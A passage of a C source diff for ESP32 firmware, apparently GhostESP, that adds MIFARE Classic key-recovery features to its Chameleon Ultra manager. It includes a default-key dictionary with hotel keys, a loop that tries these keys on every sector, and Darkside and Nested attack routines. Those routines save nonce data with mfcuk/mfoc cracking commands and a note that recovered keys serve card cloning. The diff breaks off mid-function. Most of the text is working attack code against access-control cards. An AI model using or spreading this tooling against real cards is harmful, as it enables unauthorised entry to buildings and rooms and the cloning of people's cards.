@@ -14,8 +14,11 @@
 #include "freertos/task.h"
 #include "freertos/semphr.h"
 #include "managers/views/terminal_screen.h"
+#include "managers/sd_card_manager.h"
 #include <stdio.h>
 #include <string.h>
+#include <time.h>
+#include <inttypes.h>
 
 static const char *TAG = "chameleon_manager";
 
@@ -54,6 +57,9 @@ static SemaphoreHandle_t g_response_sem = NULL;
 #define CMD_MF1_DETECT_PRNG     2002  // 0x07D2 - Detect PRNG type
 #define CMD_MF1_NESTED_ACQUIRE  2006  // 0x07D6 - Nested attack
 #define CMD_MF1_DARKSIDE_ACQUIRE 2004 // 0x07D4 - Darkside attack
+#define CMD_MF1_AUTH_ONE_KEY_BLOCK  2007  // 0x07D7 - Authenticate with key for one block
+#define CMD_MF1_READ_BLOCK      2008  // 0x07D8 - Read MIFARE Classic block
+#define CMD_MF1_READ_SECTOR     2009  // 0x07D9 - Read MIFARE Classic sector  
 #define CMD_HF14A_RAW           2010  // 0x07DA - Send raw HF command
 
 // LF commands (3000-3999)
@@ -70,6 +76,114 @@ static SemaphoreHandle_t g_response_sem = NULL;
 #define STATUS_HF_TAG_NO        0x01
 #define STATUS_LF_TAG_OK        0x00
 #define STATUS_LF_TAG_NO        0x01
+
+// Last scan data storage
+typedef struct {
+    bool valid;
+    uint8_t uid[20];  // Max UID size
+    uint8_t uid_size;
+    char tag_type[32];
+    time_t timestamp;
+} last_scan_data_t;
+
+// Full card dump storage
+#define MAX_CARD_BLOCKS 256
+#define BLOCK_SIZE 16
+
+typedef struct {
+    bool valid;
+    uint8_t uid[20];
+    uint8_t uid_size;
+    char tag_type[32];
+    time_t timestamp;
+    
+    // Card data
+    uint8_t blocks[MAX_CARD_BLOCKS][BLOCK_SIZE];
+    bool block_valid[MAX_CARD_BLOCKS];
+    uint16_t total_blocks_read;
+    uint16_t card_size_blocks;
+    
+    // MIFARE Classic specific
+    uint16_t atqa;
+    uint8_t sak;
+} card_dump_data_t;
+
+static last_scan_data_t g_last_hf_scan = {0};
+static last_scan_data_t g_last_lf_scan = {0};
+static card_dump_data_t g_last_card_dump = {0};
+
+// Common MIFARE Classic default keys
+static const uint8_t default_keys[][6] = {
+    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // Factory default
+    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5}, // Common transport key
+    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5}, // Common transport key
+    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD}, // HID Corporate
+    {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A}, // Infineon default
+    {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7}, // NFC default
+    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}, // Common test key
+    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // All zeros
+    {0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0}, // Sequence key
+    {0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97}, // Mifare Classic hotel key
+    {0x58, 0x7E, 0xE5, 0xF9, 0x35, 0x0F}, // Mifare Classic hotel key
+    {0xA2, 0x2A, 0xE1, 0x29, 0xC0, 0x13}, // Mifare Classic hotel key
+};
+
+#define NUM_DEFAULT_KEYS (sizeof(default_keys) / sizeof(default_keys[0]))
+
+// Key types for authentication
+#define MF_KEY_A 0x60
+#define MF_KEY_B 0x61
+
+// Enhanced card dump with recovered keys
+typedef struct {
+    uint8_t key[6];
+    bool valid;
+    bool recovered_by_darkside;
+    bool recovered_by_nested;
+    bool attack_data_collected; // True if we have attack data but not the actual key yet
+} sector_key_t;
+
+typedef struct {
+    sector_key_t key_a;
+    sector_key_t key_b;
+    bool auth_success_a;
+    bool auth_success_b;
+} sector_auth_t;
+
+// Darkside attack structures
+typedef struct {
+    uint8_t uid[4];
+    uint32_t nt1;
+    uint32_t nt2;
+    uint32_t nr;
+    uint32_t ar;
+    uint8_t block;
+    uint8_t key_type;
+    bool valid;
+} darkside_data_t;
+
+// Nested attack structures
+typedef struct {
+    uint8_t uid[4];
+    uint8_t known_key[6];
+    uint8_t known_block;
+    uint8_t known_key_type;
+    uint8_t target_block;
+    uint8_t target_key_type;
+    uint32_t nt1;
+    uint32_t nt2;
+    uint32_t nr;
+    uint32_t ar;
+    bool valid;
+    time_t timestamp;
+} nested_data_t;
+
+static darkside_data_t g_darkside_data = {0};
+static nested_data_t g_nested_data = {0};
+
+// Sector authentication tracking (16 sectors for MIFARE Classic 1K)
+#define MAX_SECTORS 16
+static sector_auth_t g_sector_auth[MAX_SECTORS] = {0};
 
 // Service and characteristic UUIDs for Chameleon Ultra
 // Service: 6E400001-B5A3-F393-E0A9-E50E24DCCA9E
@@ -513,6 +627,14 @@ bool chameleon_manager_scan_hf(void) {
                         }
                         TERMINAL_VIEW_ADD_TEXT("%s\nATQA: %02X %02X\nSAK: %02X\n", uid_str, atqa_hi, atqa_lo, sak);
                         
+                        // Store scan data for saving
+                        g_last_hf_scan.valid = true;
+                        g_last_hf_scan.uid_size = uid_size;
+                        memcpy(g_last_hf_scan.uid, &g_last_response.data[1], uid_size);
+                        snprintf(g_last_hf_scan.tag_type, sizeof(g_last_hf_scan.tag_type), 
+                                "HF-14A (ATQA:%02X%02X SAK:%02X)", atqa_hi, atqa_lo, sak);
+                        g_last_hf_scan.timestamp = time(NULL);
+                        
                         return true;
                     }
                 } else if (g_last_response.status == 0x01) { // HF_TAG_NO
@@ -610,6 +732,13 @@ bool chameleon_manager_scan_lf(void) {
                             strcat(uid_str, temp);
                         }
                         TERMINAL_VIEW_ADD_TEXT("%s\n", uid_str);
+                        
+                        // Store scan data for saving
+                        g_last_lf_scan.valid = true;
+                        g_last_lf_scan.uid_size = g_last_response.data_size;
+                        memcpy(g_last_lf_scan.uid, g_last_response.data, g_last_response.data_size);
+                        snprintf(g_last_lf_scan.tag_type, sizeof(g_last_lf_scan.tag_type), "LF-EM410X");
+                        g_last_lf_scan.timestamp = time(NULL);
                         
                         return true;
                     } else {
@@ -1206,4 +1335,981 @@ bool chameleon_manager_scan_hidprox(void) {
     }
     
     return false;
+}
+
+/**
+ * @brief Try to authenticate to a MIFARE Classic block with default keys
+ * @param block Block number to authenticate to
+ * @param key_type Key type (MF_KEY_A or MF_KEY_B)
+ * @param found_key Pointer to store the successful key (optional)
+ * @return true if authentication succeeded, false otherwise
+ */
+static bool authenticate_mifare_block(uint8_t block, uint8_t key_type, uint8_t* found_key) {
+    for (size_t key_idx = 0; key_idx < NUM_DEFAULT_KEYS; key_idx++) {
+        // Prepare authentication command: block + key_type + 6-byte key
+        uint8_t auth_data[8];
+        auth_data[0] = block;
+        auth_data[1] = key_type;
+        memcpy(&auth_data[2], default_keys[key_idx], 6);
+        
+        ESP_LOGI("chameleon_manager", "Trying key %zu for block %d: %02X%02X%02X%02X%02X%02X", 
+                 key_idx, block,
+                 default_keys[key_idx][0], default_keys[key_idx][1], default_keys[key_idx][2],
+                 default_keys[key_idx][3], default_keys[key_idx][4], default_keys[key_idx][5]);
+        
+        g_response_received = false;
+        bool result = send_command(CMD_MF1_AUTH_ONE_KEY_BLOCK, auth_data, 8);
+        if (!result) {
+            ESP_LOGI("chameleon_manager", "Failed to send auth command for block %d", block);
+            continue;
+        }
+        
+        // Wait for authentication response
+        if (xSemaphoreTake(g_response_sem, pdMS_TO_TICKS(3000)) == pdTRUE) {
+            if (g_response_received && g_last_response.command == CMD_MF1_AUTH_ONE_KEY_BLOCK) {
+                if (g_last_response.status == STATUS_SUCCESS || g_last_response.status == 0x00) {
+                    ESP_LOGI("chameleon_manager", "Authentication successful for block %d with key %zu", block, key_idx);
+                    
+                    // Store the successful key if requested
+                    if (found_key != NULL) {
+                        memcpy(found_key, default_keys[key_idx], 6);
+                    }
+                    
+                    return true;
+                } else {
+                    ESP_LOGI("chameleon_manager", "Authentication failed for block %d with key %zu (status: 0x%02X)", 
+                             block, key_idx, g_last_response.status);
+                }
+            }
+        } else {
+            ESP_LOGI("chameleon_manager", "Authentication timeout for block %d with key %zu", block, key_idx);
+        }
+        
+        // Small delay between key attempts
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    
+    return false;
+}
+
+/**
+ * @brief Perform MIFARE Classic Nested attack to recover keys
+ * @param known_block Block with known key
+ * @param known_key_type Known key type (MF_KEY_A or MF_KEY_B)
+ * @param known_key The known key (6 bytes)
+ * @param target_block Target block to recover key for
+ * @param target_key_type Target key type (MF_KEY_A or MF_KEY_B)
+ * @return true if attack data was collected successfully
+ */
+bool chameleon_manager_nested_attack(uint8_t known_block, uint8_t known_key_type, const uint8_t* known_key,
+                                    uint8_t target_block, uint8_t target_key_type) {
+    if (!g_is_connected) {
+        printf("Not connected to Chameleon Ultra\n");
+        TERMINAL_VIEW_ADD_TEXT("Not connected to Chameleon Ultra\n");
+        return false;
+    }
+    
+    printf("Starting MIFARE Classic Nested attack...\n");
+    printf("Known: Block %d, Key %s: %02X%02X%02X%02X%02X%02X\n", 
+           known_block, (known_key_type == MF_KEY_A) ? "A" : "B",
+           known_key[0], known_key[1], known_key[2], known_key[3], known_key[4], known_key[5]);
+    printf("Target: Block %d, Key %s\n", target_block, (target_key_type == MF_KEY_A) ? "A" : "B");
+    
+    TERMINAL_VIEW_ADD_TEXT("Starting MIFARE Classic Nested attack...\n");
+    TERMINAL_VIEW_ADD_TEXT("Known: Block %d, Target: Block %d\n", known_block, target_block);
+    
+    // First ensure we have a card and it's in reader mode
+    if (!chameleon_manager_scan_hf()) {
+        printf("Failed to scan HF card first\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to scan HF card first\n");
+        return false;
+    }
+    
+    // Initialize nested data structure
+    memset(&g_nested_data, 0, sizeof(g_nested_data));
+    g_nested_data.timestamp = time(NULL);
+    
+    // Copy card and attack parameters
+    if (g_last_hf_scan.valid && g_last_hf_scan.uid_size >= 4) {
+        memcpy(g_nested_data.uid, g_last_hf_scan.uid, 4);
+        memcpy(g_nested_data.known_key, known_key, 6);
+        g_nested_data.known_block = known_block;
+        g_nested_data.known_key_type = known_key_type;
+        g_nested_data.target_block = target_block;
+        g_nested_data.target_key_type = target_key_type;
+        
+        printf("Card UID: %02X%02X%02X%02X\n", 
+               g_nested_data.uid[0], g_nested_data.uid[1], 
+               g_nested_data.uid[2], g_nested_data.uid[3]);
+    } else {
+        printf("Invalid UID from card scan\n");
+        TERMINAL_VIEW_ADD_TEXT("Invalid UID from card scan\n");
+        return false;
+    }
+    
+    // Prepare nested attack command
+    // Command format: known_block + known_key_type + known_key(6) + target_block + target_key_type
+    uint8_t nested_cmd[10];
+    nested_cmd[0] = known_block;
+    nested_cmd[1] = known_key_type;
+    memcpy(&nested_cmd[2], known_key, 6);
+    nested_cmd[8] = target_block;
+    nested_cmd[9] = target_key_type;
+    
+    printf("Executing Nested attack (this may take several seconds)...\n");
+    TERMINAL_VIEW_ADD_TEXT("Executing Nested attack...\n");
+    
+    g_response_received = false;
+    bool result = send_command(CMD_MF1_NESTED_ACQUIRE, nested_cmd, 10);
+    if (!result) {
+        printf("Failed to send Nested attack command\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to send Nested attack command\n");
+        return false;
+    }
+    
+    // Wait for nested response (this can take longer than normal commands)
+    if (xSemaphoreTake(g_response_sem, pdMS_TO_TICKS(20000)) == pdTRUE) {
+        if (g_response_received && g_last_response.command == CMD_MF1_NESTED_ACQUIRE) {
+            if (g_last_response.status == STATUS_SUCCESS || g_last_response.status == 0x00) {
+                printf("Nested attack data collected successfully!\n");
+                TERMINAL_VIEW_ADD_TEXT("Nested attack data collected successfully!\n");
+                
+                // Parse nested response data
+                if (g_last_response.data_size >= 16) {
+                    // Extract nonces and authentication data
+                    // Format typically: nt1(4) + nt2(4) + nr(4) + ar(4)
+                    memcpy(&g_nested_data.nt1, &g_last_response.data[0], 4);
+                    memcpy(&g_nested_data.nt2, &g_last_response.data[4], 4);
+                    memcpy(&g_nested_data.nr, &g_last_response.data[8], 4);
+                    memcpy(&g_nested_data.ar, &g_last_response.data[12], 4);
+                    
+                    // Convert from network byte order if needed
+                    g_nested_data.nt1 = __builtin_bswap32(g_nested_data.nt1);
+                    g_nested_data.nt2 = __builtin_bswap32(g_nested_data.nt2);
+                    g_nested_data.nr = __builtin_bswap32(g_nested_data.nr);
+                    g_nested_data.ar = __builtin_bswap32(g_nested_data.ar);
+                    
+                    g_nested_data.valid = true;
+                    
+                    printf("Nested Data Collected:\n");
+                    printf("  NT1: %08" PRIX32 "\n", g_nested_data.nt1);
+                    printf("  NT2: %08" PRIX32 "\n", g_nested_data.nt2);
+                    printf("  NR:  %08" PRIX32 "\n", g_nested_data.nr);
+                    printf("  AR:  %08" PRIX32 "\n", g_nested_data.ar);
+                    
+                    TERMINAL_VIEW_ADD_TEXT("Nested data collected:\n");
+                    TERMINAL_VIEW_ADD_TEXT("NT1: %08" PRIX32 ", NT2: %08" PRIX32 "\n", g_nested_data.nt1, g_nested_data.nt2);
+                    TERMINAL_VIEW_ADD_TEXT("NR: %08" PRIX32 ", AR: %08" PRIX32 "\n", g_nested_data.nr, g_nested_data.ar);
+                    
+                    printf("\nNote: Use this data with offline tools like 'mfcuk' or 'libnfc-mfcuk' to recover the key.\n");
+                    TERMINAL_VIEW_ADD_TEXT("Use data with offline tools to recover the key.\n");
+                    
+                    return true;
+                } else {
+                    printf("Insufficient data received from Nested attack (got %d bytes, expected 16+)\n", 
+                           g_last_response.data_size);
+                    TERMINAL_VIEW_ADD_TEXT("Insufficient data from Nested attack\n");
+                }
+            } else {
+                printf("Nested attack failed with status: 0x%02X\n", g_last_response.status);
+                TERMINAL_VIEW_ADD_TEXT("Nested attack failed with status: 0x%02X\n", g_last_response.status);
+                
+                // Provide some guidance on common failure reasons
+                if (g_last_response.status == 0x01) {
+                    printf("Known key authentication failed - verify the key is correct\n");
+                    TERMINAL_VIEW_ADD_TEXT("Known key authentication failed\n");
+                } else if (g_last_response.status == 0x60) {
+                    printf("Authentication error - check key and block numbers\n");
+                    TERMINAL_VIEW_ADD_TEXT("Authentication error\n");
+                }
+            }
+        }
+    } else {
+        printf("Nested attack command timed out\n");
+        TERMINAL_VIEW_ADD_TEXT("Nested attack command timed out\n");
+    }
+    
+    return false;
+}
+
+/**
+ * @brief Save Nested attack data to SD card for offline analysis
+ * @param filename Custom filename (optional)
+ * @return true if data was saved successfully
+ */
+bool chameleon_manager_save_nested_data(const char* filename) {
+    if (!g_nested_data.valid) {
+        printf("No Nested attack data to save\n");
+        TERMINAL_VIEW_ADD_TEXT("No Nested attack data to save\n");
+        return false;
+    }
+    
+    // Create filename if not provided
+    char file_path[128];
+    if (filename == NULL) {
+        struct tm* time_info = localtime(&g_nested_data.timestamp);
+        snprintf(file_path, sizeof(file_path), "/mnt/ghostesp/chameleon/nested_%02X%02X%02X%02X_%04d%02d%02d_%02d%02d%02d.txt",
+                g_nested_data.uid[0], g_nested_data.uid[1], g_nested_data.uid[2], g_nested_data.uid[3],
+                time_info->tm_year + 1900, time_info->tm_mon + 1, time_info->tm_mday,
+                time_info->tm_hour, time_info->tm_min, time_info->tm_sec);
+    } else {
+        snprintf(file_path, sizeof(file_path), "/mnt/ghostesp/chameleon/%s", filename);
+    }
+    
+    // Ensure directory exists
+    sd_card_create_directory("/mnt/ghostesp/chameleon");
+    
+    // Create nested data content
+    char content[1024];
+    int len = snprintf(content, sizeof(content),
+        "MIFARE Classic Nested Attack Data\n"
+        "==================================\n"
+        "Timestamp: %s"
+        "Card UID: %02X%02X%02X%02X\n"
+        "Known Block: %d\n"
+        "Known Key Type: %s\n"
+        "Known Key: %02X%02X%02X%02X%02X%02X\n"
+        "Target Block: %d\n"
+        "Target Key Type: %s\n\n"
+        "Attack Data:\n"
+        "NT1: %08" PRIX32 "\n"
+        "NT2: %08" PRIX32 "\n"
+        "NR:  %08" PRIX32 "\n"
+        "AR:  %08" PRIX32 "\n\n"
+        "Usage Instructions:\n"
+        "==================\n"
+        "Use this data with offline MIFARE cracking tools:\n\n"
+        "mfcuk method:\n"
+        "mfcuk -C -R %d:%08" PRIX32 " -s 200 -S 200\n\n"
+        "libnfc method:\n"
+        "nfc-mfcuk -k %02X%02X%02X%02X%02X%02X -n %08" PRIX32 "\n\n"
+        "Note: Nested attacks use known keys to recover unknown keys.\n"
+        "The recovered key can then be used for card cloning or further analysis.\n",
+        ctime(&g_nested_data.timestamp),
+        g_nested_data.uid[0], g_nested_data.uid[1], g_nested_data.uid[2], g_nested_data.uid[3],
+        g_nested_data.known_block,
+        (g_nested_data.known_key_type == MF_KEY_A) ? "A" : "B",
+        g_nested_data.known_key[0], g_nested_data.known_key[1], g_nested_data.known_key[2],
+        g_nested_data.known_key[3], g_nested_data.known_key[4], g_nested_data.known_key[5],
+        g_nested_data.target_block,
+        (g_nested_data.target_key_type == MF_KEY_A) ? "A" : "B",
+        g_nested_data.nt1, g_nested_data.nt2,
+        g_nested_data.nr, g_nested_data.ar,
+        g_nested_data.known_block, g_nested_data.nt1,
+        g_nested_data.known_key[0], g_nested_data.known_key[1], g_nested_data.known_key[2],
+        g_nested_data.known_key[3], g_nested_data.known_key[4], g_nested_data.known_key[5],
+        g_nested_data.nt1);
+    
+    // Write to SD card
+    esp_err_t result = sd_card_write_file(file_path, content, len);
+    if (result == ESP_OK) {
+        printf("Nested data saved to: %s\n", file_path);
+        TERMINAL_VIEW_ADD_TEXT("Nested data saved to: %s\n", file_path);
+        return true;
+    } else {
+        printf("Failed to save Nested data\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to save Nested data\n");
+        return false;
+    }
+}
+
+/**
+ * @brief Perform MIFARE Classic Darkside attack to recover keys
+ * @param block Target block number  
+ * @param key_type Key type (MF_KEY_A or MF_KEY_B)
+ * @return true if attack data was collected successfully
+ */
+bool chameleon_manager_darkside_attack(uint8_t block, uint8_t key_type) {
+    if (!g_is_connected) {
+        printf("Not connected to Chameleon Ultra\n");
+        TERMINAL_VIEW_ADD_TEXT("Not connected to Chameleon Ultra\n");
+        return false;
+    }
+    
+    printf("Starting MIFARE Classic Darkside attack...\n");
+    printf("Target: Block %d, Key Type: %s\n", block, (key_type == MF_KEY_A) ? "A" : "B");
+    TERMINAL_VIEW_ADD_TEXT("Starting MIFARE Classic Darkside attack...\n");
+    TERMINAL_VIEW_ADD_TEXT("Target: Block %d, Key Type: %s\n", block, (key_type == MF_KEY_A) ? "A" : "B");
+    
+    // First ensure we have a card and it's in reader mode
+    if (!chameleon_manager_scan_hf()) {
+        printf("Failed to scan HF card first\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to scan HF card first\n");
+        return false;
+    }
+    
+    // Initialize darkside data structure
+    memset(&g_darkside_data, 0, sizeof(g_darkside_data));
+    
+    // Copy UID from last scan
+    if (g_last_hf_scan.valid && g_last_hf_scan.uid_size >= 4) {
+        memcpy(g_darkside_data.uid, g_last_hf_scan.uid, 4);
+        g_darkside_data.block = block;
+        g_darkside_data.key_type = key_type;
+        
+        printf("Card UID: %02X%02X%02X%02X\n", 
+               g_darkside_data.uid[0], g_darkside_data.uid[1], 
+               g_darkside_data.uid[2], g_darkside_data.uid[3]);
+        TERMINAL_VIEW_ADD_TEXT("Card UID: %02X%02X%02X%02X\n",
+               g_darkside_data.uid[0], g_darkside_data.uid[1], 
+               g_darkside_data.uid[2], g_darkside_data.uid[3]);
+    } else {
+        printf("Invalid UID from card scan\n");
+        TERMINAL_VIEW_ADD_TEXT("Invalid UID from card scan\n");
+        return false;
+    }
+    
+    // Prepare darkside attack command
+    // Command format: block + key_type
+    uint8_t darkside_cmd[2];
+    darkside_cmd[0] = block;
+    darkside_cmd[1] = key_type;
+    
+    printf("Executing Darkside attack (this may take several seconds)...\n");
+    TERMINAL_VIEW_ADD_TEXT("Executing Darkside attack...\n");
+    
+    g_response_received = false;
+    bool result = send_command(CMD_MF1_DARKSIDE_ACQUIRE, darkside_cmd, 2);
+    if (!result) {
+        printf("Failed to send Darkside attack command\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to send Darkside attack command\n");
+        return false;
+    }
+    
+    // Wait for darkside response (this can take longer than normal commands)
+    if (xSemaphoreTake(g_response_sem, pdMS_TO_TICKS(15000)) == pdTRUE) {
+        if (g_response_received && g_last_response.command == CMD_MF1_DARKSIDE_ACQUIRE) {
+            if (g_last_response.status == STATUS_SUCCESS || g_last_response.status == 0x00) {
+                printf("Darkside attack data collected successfully!\n");
+                TERMINAL_VIEW_ADD_TEXT("Darkside attack data collected successfully!\n");
+                
+                // Parse darkside response data
+                if (g_last_response.data_size >= 16) {
+                    // Extract nonces and authentication data
+                    // Format typically: nt1(4) + nt2(4) + nr(4) + ar(4)
+                    memcpy(&g_darkside_data.nt1, &g_last_response.data[0], 4);
+                    memcpy(&g_darkside_data.nt2, &g_last_response.data[4], 4);
+                    memcpy(&g_darkside_data.nr, &g_last_response.data[8], 4);
+                    memcpy(&g_darkside_data.ar, &g_last_response.data[12], 4);
+                    
+                    // Convert from network byte order if needed
+                    g_darkside_data.nt1 = __builtin_bswap32(g_darkside_data.nt1);
+                    g_darkside_data.nt2 = __builtin_bswap32(g_darkside_data.nt2);
+                    g_darkside_data.nr = __builtin_bswap32(g_darkside_data.nr);
+                    g_darkside_data.ar = __builtin_bswap32(g_darkside_data.ar);
+                    
+                    g_darkside_data.valid = true;
+                    
+                    printf("Darkside Data Collected:\n");
+                    printf("  NT1: %08" PRIX32 "\n", g_darkside_data.nt1);
+                    printf("  NT2: %08" PRIX32 "\n", g_darkside_data.nt2);
+                    printf("  NR:  %08" PRIX32 "\n", g_darkside_data.nr);
+                    printf("  AR:  %08" PRIX32 "\n", g_darkside_data.ar);
+                    
+                    TERMINAL_VIEW_ADD_TEXT("Darkside data collected:\n");
+                    TERMINAL_VIEW_ADD_TEXT("NT1: %08" PRIX32 ", NT2: %08" PRIX32 "\n", g_darkside_data.nt1, g_darkside_data.nt2);
+                    TERMINAL_VIEW_ADD_TEXT("NR: %08" PRIX32 ", AR: %08" PRIX32 "\n", g_darkside_data.nr, g_darkside_data.ar);
+                    
+                    printf("\nNote: Use this data with offline tools like 'mfcuk' or 'mfoc' to recover the key.\n");
+                    TERMINAL_VIEW_ADD_TEXT("Use data with offline tools to recover the key.\n");
+                    
+                    return true;
+                } else {
+                    printf("Insufficient data received from Darkside attack (got %d bytes, expected 16+)\n", 
+                           g_last_response.data_size);
+                    TERMINAL_VIEW_ADD_TEXT("Insufficient data from Darkside attack\n");
+                }
+            } else {
+                printf("Darkside attack failed with status: 0x%02X\n", g_last_response.status);
+                TERMINAL_VIEW_ADD_TEXT("Darkside attack failed with status: 0x%02X\n", g_last_response.status);
+                
+                // Provide some guidance on common failure reasons
+                if (g_last_response.status == 0x01) {
+                    printf("Card may not be vulnerable to Darkside attack (fixed nonce)\n");
+                    TERMINAL_VIEW_ADD_TEXT("Card may not be vulnerable to Darkside attack\n");
+                } else if (g_last_response.status == 0x60) {
+                    printf("Authentication error - card may be using non-standard implementation\n");
+                    TERMINAL_VIEW_ADD_TEXT("Authentication error\n");
+                }
+            }
+        }
+    } else {
+        printf("Darkside attack command timed out\n");
+        TERMINAL_VIEW_ADD_TEXT("Darkside attack command timed out\n");
+    }
+    
+    return false;
+}
+
+/**
+ * @brief Save Darkside attack data to SD card for offline analysis
+ * @param filename Custom filename (optional)
+ * @return true if data was saved successfully
+ */
+bool chameleon_manager_save_darkside_data(const char* filename) {
+    if (!g_darkside_data.valid) {
+        printf("No Darkside attack data to save\n");
+        TERMINAL_VIEW_ADD_TEXT("No Darkside attack data to save\n");
+        return false;
+    }
+    
+    // Create filename if not provided
+    char file_path[128];
+    time_t now = time(NULL);
+    if (filename == NULL) {
+        struct tm* time_info = localtime(&now);
+        snprintf(file_path, sizeof(file_path), "/mnt/ghostesp/chameleon/darkside_%02X%02X%02X%02X_%04d%02d%02d_%02d%02d%02d.txt",
+                g_darkside_data.uid[0], g_darkside_data.uid[1], g_darkside_data.uid[2], g_darkside_data.uid[3],
+                time_info->tm_year + 1900, time_info->tm_mon + 1, time_info->tm_mday,
+                time_info->tm_hour, time_info->tm_min, time_info->tm_sec);
+    } else {
+        snprintf(file_path, sizeof(file_path), "/mnt/ghostesp/chameleon/%s", filename);
+    }
+    
+    // Ensure directory exists
+    sd_card_create_directory("/mnt/ghostesp/chameleon");
+    
+    // Create darkside data content
+    char content[1024];
+    int len = snprintf(content, sizeof(content),
+        "MIFARE Classic Darkside Attack Data\n"
+        "===================================\n"
+        "Timestamp: %s"
+        "Card UID: %02X%02X%02X%02X\n"
+        "Target Block: %d\n"
+        "Key Type: %s\n\n"
+        "Attack Data:\n"
+        "NT1: %08" PRIX32 "\n"
+        "NT2: %08" PRIX32 "\n"
+        "NR:  %08" PRIX32 "\n"
+        "AR:  %08" PRIX32 "\n\n"
+        "Usage Instructions:\n"
+        "==================\n"
+        "Use this data with offline MIFARE cracking tools:\n\n"
+        "mfcuk method:\n"
+        "mfcuk -C -R 0:%08" PRIX32 " -s 200 -S 200\n\n"
+        "mfoc method:\n"
+        "mfoc -O key.dmp\n\n"
+        "Note: These tools require the nonce data to recover the key.\n"
+        "The recovered key can then be used for card cloning or further analysis.\n",
+        ctime(&now),
+        g_darkside_data.uid[0], g_darkside_data.uid[1], g_darkside_data.uid[2], g_darkside_data.uid[3],
+        g_darkside_data.block,
+        (g_darkside_data.key_type == MF_KEY_A) ? "A" : "B",
+        g_darkside_data.nt1, g_darkside_data.nt2,
+        g_darkside_data.nr, g_darkside_data.ar,
+        g_darkside_data.nt1);
+    
+    // Write to SD card
+    esp_err_t result = sd_card_write_file(file_path, content, len);
+    if (result == ESP_OK) {
+        printf("Darkside data saved to: %s\n", file_path);
+        TERMINAL_VIEW_ADD_TEXT("Darkside data saved to: %s\n", file_path);
+        return true;
+    } else {
+        printf("Failed to save Darkside data\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to save Darkside data\n");
+        return false;
+    }
+}
+
+bool chameleon_manager_read_hf_card(void) {
+    if (!g_is_connected) {
+        printf("Not connected to Chameleon Ultra\n");
+        TERMINAL_VIEW_ADD_TEXT("Not connected to Chameleon Ultra\n");
+        return false;
+    }
+    
+    printf("Starting comprehensive MIFARE Classic card analysis...\n");
+    TERMINAL_VIEW_ADD_TEXT("Starting comprehensive MIFARE Classic card analysis...\n");
+    
+    // First scan to get card info
+    if (!chameleon_manager_scan_hf()) {
+        printf("Failed to scan HF card first\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to scan HF card first\n");
+        return false;
+    }
+    
+    // Initialize data structures
+    memset(&g_last_card_dump, 0, sizeof(g_last_card_dump));
+    memset(g_sector_auth, 0, sizeof(g_sector_auth));
+    g_last_card_dump.valid = true;
+    g_last_card_dump.timestamp = time(NULL);
+    
+    // Copy basic info from scan
+    if (g_last_hf_scan.valid) {
+        memcpy(g_last_card_dump.uid, g_last_hf_scan.uid, g_last_hf_scan.uid_size);
+        g_last_card_dump.uid_size = g_last_hf_scan.uid_size;
+        strncpy(g_last_card_dump.tag_type, g_last_hf_scan.tag_type, sizeof(g_last_card_dump.tag_type));
+    }
+    
+    printf("Phase 1: Attempting authentication with default keys...\n");
+    TERMINAL_VIEW_ADD_TEXT("Phase 1: Attempting authentication with default keys...\n");
+    
+    // Try to read all 64 blocks (MIFARE Classic 1K)
+    uint16_t total_blocks = 64;
+    uint16_t total_sectors = 16;
+    uint16_t successful_reads = 0;
+    uint16_t sectors_authenticated = 0;
+    uint16_t sectors_failed_auth = 0;
+    
+    // Phase 1: Try default key authentication for each sector
+    for (uint8_t sector = 0; sector < total_sectors; sector++) {
+        printf("Sector %d: Testing default keys...\n", sector);
+        
+        uint8_t sector_first_block = sector * 4;
+        uint8_t found_key[6];
+        
+        // Try Key A
+        if (authenticate_mifare_block(sector_first_block, MF_KEY_A, found_key)) {
+            g_sector_auth[sector].auth_success_a = true;
+            memcpy(g_sector_auth[sector].key_a.key, found_key, 6);
+            g_sector_auth[sector].key_a.valid = true;
+            g_sector_auth[sector].key_a.recovered_by_darkside = false;
+            sectors_authenticated++;
+            
+            printf("  Key A found: %02X%02X%02X%02X%02X%02X\n", 
+                   found_key[0], found_key[1], found_key[2], found_key[3], found_key[4], found_key[5]);
+        }
+        
+        // Try Key B
+        if (authenticate_mifare_block(sector_first_block, MF_KEY_B, found_key)) {
+            g_sector_auth[sector].auth_success_b = true;
+            memcpy(g_sector_auth[sector].key_b.key, found_key, 6);
+            g_sector_auth[sector].key_b.valid = true;
+            g_sector_auth[sector].key_b.recovered_by_darkside = false;
+            
+            printf("  Key B found: %02X%02X%02X%02X%02X%02X\n", 
+                   found_key[0], found_key[1], found_key[2], found_key[3], found_key[4], found_key[5]);
+        }
+        
+        if (!g_sector_auth[sector].auth_success_a && !g_sector_auth[sector].auth_success_b) {
+            sectors_failed_auth++;
+            printf("  No default keys work\n");
+        }
+        
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    
+    printf("Default key results: %d sectors authenticated, %d failed\n", sectors_authenticated, sectors_failed_auth);
+    TERMINAL_VIEW_ADD_TEXT("Default keys: %d sectors authenticated, %d failed\n", sectors_authenticated, sectors_failed_auth);
+    
+    // Phase 2: Attempt Darkside attacks on failed sectors
+    if (sectors_failed_auth > 0) {
+        printf("\nPhase 2: Attempting Darkside attacks on protected sectors...\n");
+        TERMINAL_VIEW_ADD_TEXT("Phase 2: Attempting Darkside attacks...\n");
+        
+        for (uint8_t sector = 0; sector < total_sectors; sector++) {
+            if (!g_sector_auth[sector].auth_success_a && !g_sector_auth[sector].auth_success_b) {
+                printf("Sector %d: Attempting Darkside attack...\n", sector);
